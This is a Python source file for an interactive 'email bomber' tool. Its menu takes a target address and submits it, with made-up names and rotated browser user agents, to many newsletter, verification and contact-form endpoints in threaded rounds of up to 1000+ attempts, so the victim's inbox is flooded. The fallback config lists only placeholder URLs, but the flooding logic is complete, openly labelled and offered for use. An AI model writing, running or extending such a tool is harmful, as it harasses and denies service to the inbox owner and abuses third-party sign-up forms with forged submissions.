

import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import inquirer
from urllib.parse import urlencode
import json
import os

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

class EmailBomber:
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        self.config = self.load_config()
        self.successful = 0
        self.failed = 0
        
    def load_config(self):
        config_path = os.path.join(os.path.dirname(__file__), 'email_bomber_config.json')
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            print("❌ Config file not found! Using fallback URLs...")
            return self.get_fallback_config()
    
    def get_fallback_config(self):
        return {
            "newsletter_sites": [
                {"name": "Newsletter Service 1", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Newsletter Service 2", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Newsletter Service 3", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Newsletter Service 4", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Newsletter Service 5", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}}
            ],
            "verification_services": [
                {"name": "Email Verification 1", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Email Verification 2", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Email Verification 3", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Email Verification 4", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Email Verification 5", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}}
            ],
            "contact_forms": [
                {"name": "Contact Form 1", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Contact Form 2", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Contact Form 3", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Contact Form 4", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}},
                {"name": "Contact Form 5", "url": "https://httpbin.org/post", "method": "POST", "data": {"email": "{email}"}}
            ]
        }
    
    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
    
    def generate_fake_data(self, email):
        first_names = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Lisa', 'Chris', 'Emma', 'Alex', 'Maria']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        
        return {
            'email': email,
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'name': f"{random.choice(first_names)} {random.choice(last_names)}",
            'phone': f"+1{random.randint(1000000000, 9999999999)}",
            'company': f"Company{random.randint(1, 999)}",
            'message': 'Please add me to your mailing list and send me updates.',
            'subject': 'Newsletter Subscription Request'
        }
    
    def make_request(self, site_info, email):
        try:
            headers = self.get_random_headers()
            if 'headers' in site_info:
                headers.update(site_info['headers'])
            
            url = site_info['url'].replace('{email}', email)
            method = site_info.get('method', 'POST').upper()
            
            fake_data = self.generate_fake_data(email)
            
            if method == 'POST':
                data = site_info.get('data', {})
                for key, value in data.items():
                    if isinstance(value, str) and '{email}' in value:
                        data[key] = value.replace('{email}', email)
                    elif key == 'email':
                        data[key] = email
                
                data.update(fake_data)
                
                response = self.session.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    timeout=10,
                    allow_redirects=True
                )
            else:
                params = site_info.get('params', {})
                for key, value in params.items():
                    if isinstance(value, str) and '{email}' in value:
                        params[key] = value.replace('{email}', email)
                
                response = self.session.get(
                    url, 
                    params=params, 
                    headers=headers, 
                    timeout=10,
                    allow_redirects=True
                )
            
            if response.status_code in [200, 201, 202, 204]:
                self.successful += 1
                return True, site_info['name'], response.status_code
            else:
                self.failed += 1
                return False, site_info['name'], response.status_code
                
        except Exception as e:
            self.failed += 1
            return False, site_info['name'], str(e)
    
    def bomb_email_category(self, email, category_name, max_workers=10):
        if category_name not in self.config:
            print(f"❌ Category '{category_name}' not found in config!")
            return
        
        sites = self.config[category_name]
        print(f"🎯 Targeting {len(sites)} {category_name.replace('_', ' ')} sites...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_site = {executor.submit(self.make_request, site, email): site for site in sites}
            
            for future in as_completed(future_to_site):
                site = future_to_site[future]
                try:
                    success, name, status = future.result()
                    if success:
                        print(f"✅ {name}: Registration/Subscription successful")
                    else:
                        print(f"❌ {name}: Failed ({status})")
                except Exception as e:
                    print(f"❌ {site['name']}: Error ({str(e)})")
                
                time.sleep(random.uniform(0.1, 0.5))
    
    def basic_email_bomb(self, email, rounds=5):
        print(f"💣 Starting basic email bombing for: {email}")
        
        for round_num in range(1, rounds + 1):
            print(f"🔄 Round {round_num}/{rounds}")
            
            categories = ['newsletter_sites', 'verification_services', 'contact_forms']
            for category in categories:
                if category in self.config:
                    self.bomb_email_category(email, category, max_workers=5)
                    time.sleep(1)
            
            print(f"✅ Successful: {self.successful}")
            print(f"❌ Failed: {self.failed}")
            print(f"📧 Total attempts: {self.successful + self.failed}")
            print("-" * 50)
            
            if round_num < rounds:
                time.sleep(random.uniform(2, 5))
    
    def advanced_email_bomb(self, email, rounds=10):
        print(f"💣 Starting advanced email bombing for: {email}")
        
        for round_num in range(1, rounds + 1):
            print(f"🔄 Round {round_num}/{rounds}")
            
            categories = ['newsletter_sites', 'verification_services', 'contact_forms', 'marketing_lists', 'lead_generation']
            for category in categories:
                if category in self.config:
                    self.bomb_email_category(email, category, max_workers=8)
                    time.sleep(0.5)
            
            print(f"✅ Successful: {self.successful}")
            print(f"❌ Failed: {self.failed}")
            print(f"📧 Total attempts: {self.successful + self.failed}")
            print("-" * 50)
            
            if round_num < rounds:
                time.sleep(random.uniform(1, 3))
    
    def ultimate_email_bomb(self, email, rounds=20):
        print(f"💣 Starting ULTIMATE email bombing for: {email}")
        print("⚠️  This will perform 1000+ registration/subscription attempts!")
        
        for round_num in range(1, rounds + 1):
            print(f"🔄 Round {round_num}/{rounds}")
            
            all_categories = list(self.config.keys())
            for category in all_categories:
                self.bomb_email_category(email, category, max_workers=15)
                time.sleep(0.2)
            
            print(f"✅ Successful: {self.successful}")
            print(f"❌ Failed: {self.failed}")
            print(f"📧 Total attempts: {self.successful + self.failed}")
            print("-" * 50)
            
            if round_num < rounds:
                time.sleep(random.uniform(0.5, 2))
    
    def custom_bomb(self, email, categories, rounds=5, max_workers=10):
        print(f"💣 Starting custom email bombing for: {email}")
        print(f"🎯 Using categories: {', '.join(categories)}")
        
        for round_num in range(1, rounds + 1):
            print(f"🔄 Round {round_num}/{rounds}")
            
            for category in categories:
                if category in self.config:
                    self.bomb_email_category(email, category, max_workers)
                    time.sleep(0.5)
                else:
                    print(f"❌ Category '{category}' not found!")
            
            print(f"✅ Successful: {self.successful}")
            print(f"❌ Failed: {self.failed}")
            print(f"📧 Total attempts: {self.successful + self.failed}")
            print("-" * 50)
            
            if round_num < rounds:
                time.sleep(random.uniform(1, 3))
    
    def show_available_categories(self):
        print("📋 Available categories:")
        for i, category in enumerate(self.config.keys(), 1):
            sites_count = len(self.config[category])
            print(f"{i}. {category.replace('_', ' ').title()} ({sites_count} sites)")
    
    def reset_counters(self):
        self.successful = 0
        self.failed = 0

def email_bomber_menu():
    bomber = EmailBomber()
    
    while True:
        print("\n" + "="*60)
        print("💣 EMAIL BOMBER - Advanced Email Flooding Tool")
        print("="*60)
        print("1. 📧 Basic Email Bomb (Newsletter + Verification)")
        print("2. 🔥 Advanced Email Bomb (All Marketing Services)")
        print("3. ☢️  Ultimate Email Bomb (ALL Categories - 1000+ attempts)")
        print("4. 🎯 Custom Category Bomb")
        print("5. 📋 Show Available Categories")
        print("6. 🔄 Reset Counters")
        print("0. ⬅️  Back to Main Menu")
        print("="*60)
        
        choice = input("Select option: ").strip()
        
        if choice == '1':
            email = input("Enter target email: ").strip()
            if email:
                rounds = int(input("Enter number of rounds (default 5): ") or "5")
                bomber.reset_counters()
                bomber.basic_email_bomb(email, rounds)
                input("\nPress Enter to continue...")
        
        elif choice == '2':
            email = input("Enter target email: ").strip()
            if email:
                rounds = int(input("Enter number of rounds (default 10): ") or "10")
                bomber.reset_counters()
                bomber.advanced_email_bomb(email, rounds)
                input("\nPress Enter to continue...")
        
        elif choice == '3':
            email = input("Enter target email: ").strip()
            if email:
                confirm = input("⚠️  This will perform 1000+ attempts! Continue? (y/N): ").strip().lower()
                if confirm == 'y':
                    rounds = int(input("Enter number of rounds (default 20): ") or "20")
                    bomber.reset_counters()
                    bomber.ultimate_email_bomb(email, rounds)
                input("\nPress Enter to continue...")
        
        elif choice == '4':
            bomber.show_available_categories()
            email = input("\nEnter target email: ").strip()
            if email:
                categories_input = input("Enter category numbers (comma-separated): ").strip()
                try:
                    category_indices = [int(x.strip()) - 1 for x in categories_input.split(',')]
                    categories = [list(bomber.config.keys())[i] for i in category_indices if 0 <= i < len(bomber.config)]
                    
                    if categories:
                        rounds = int(input("Enter number of rounds (default 5): ") or "5")
                        max_workers = int(input("Enter max workers (default 10): ") or "10")
                        bomber.reset_counters()
                        bomber.custom_bomb(email, categories, rounds, max_workers)
                    else:
                        print("❌ No valid categories selected!")
                except ValueError:
                    print("❌ Invalid input format!")
                input("\nPress Enter to continue...")
        
        elif choice == '5':
            bomber.show_available_categories()
            input("\nPress Enter to continue...")
        
        elif choice == '6':
            bomber.reset_counters()
            print("✅ Counters reset!")
            input("Press Enter to continue...")
        
        elif choice == '0':
            break
        
        else:
            print("❌ Invalid option!")
            input("Press Enter to continue...")

def run_email_bomber():
    email_bomber_menu()

if __name__ == "__main__":
    email_bomber_menu() 